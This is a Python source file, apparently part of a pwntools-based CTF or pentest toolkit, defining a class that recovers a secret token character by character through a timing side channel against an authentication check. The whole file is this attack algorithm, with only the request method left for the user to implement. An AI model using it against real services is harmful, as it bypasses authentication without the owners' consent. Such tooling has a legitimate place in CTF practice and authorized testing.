# -*- coding: utf-8 -*-

import time
from pwn import log
from .config import (DEFAULT_CHARSET,
                     DEFAULT_TOKEN_LENGTH,
                     DEFAULT_HIDDEN_CHAR
                     )


class TimeAuthChecker(object):

    """ Class used to bypass a time based authentication """

    def __init__(self,
                 charset=DEFAULT_CHARSET,
                 token_length=DEFAULT_TOKEN_LENGTH,
                 base_token="",
                 hidden_char=DEFAULT_HIDDEN_CHAR):

        """ Checker constructor

        :charset: TODO
        """
        self._charset = charset
        self._token_length = token_length
        self._hidden_char = hidden_char
        self._token = [c for c in base_token] + [self._hidden_char for _ in range(self._token_length - len(base_token))]

    @classmethod
    def _avg(cls, l):
        """ Calculate the average of an uniform list """
        return sum(l) / float(len(l))

    def request(self):

        """ Do a request on a server to check the validity of a new token

            :token: the new string token to check
        """
        raise NotImplementedError('You should implement this one')

    def get_token(self):
        return ''.join(self._token)

    def _get_token_offsets(self):

        """ Retrieve the token extremities from the length and the hidden char

            exemple: whith self._token = "abc__" : _get_token_offsets() => [0, 2]
        """
        return range(len(''.join(self._token).rstrip(self._hidden_char)), self._token_length)

    def _get_timing(self):

        """ Get a time based unit """
        return time.time()

    def _log(self, progress, offset, char, t1, t2, timings, i, best_candidate):

        """ progress loading with average and other informations """
        progress.status("""
                        Testing %d/%d '%c' \\x%x
                        Current Flag: [%s]
                        Took: %s
                        Max: %s:%c
                        Avg: %s
                        """ % (
                            i,
                            self._token_length,
                            char,
                            ord(char),
                            ''.join(self._token),
                            (t2 - t1),
                            max(timings),
                            best_candidate,
                            self._avg(timings)
                        ))

    def process(self):

        """ Iterate on token_length and find more intresting char """
        log.info("Start guessing token ..")
        progress = log.progress('Auth ..')
        for offset in self._get_token_offsets():
            timings = []
            for i, char in enumerate(self._charset):
                self._token[offset] = char
                t1 = self._get_timing()
                self.request()
                t2 = self._get_timing()
                timings.append(t2 - t1)
                best_candidate = self._charset[timings.index(max(timings))]
                self._log(progress, offset, char, t1, t2, timings, i, best_candidate)
            found_char = self._charset[timings.index(max(timings))]
            self._token[offset] = found_char
            log.success("Found Char: %d:%x:%c - Best: %s - Avg: %s" % (
                ord(found_char),
                ord(found_char),
                found_char,
                max(timings),
                self._avg(timings)
            ))
        progress.success("DONE! %s" % (self.get_token()))

    def print_token(self):
        log.success("Your token : [%s]" % self.get_token())
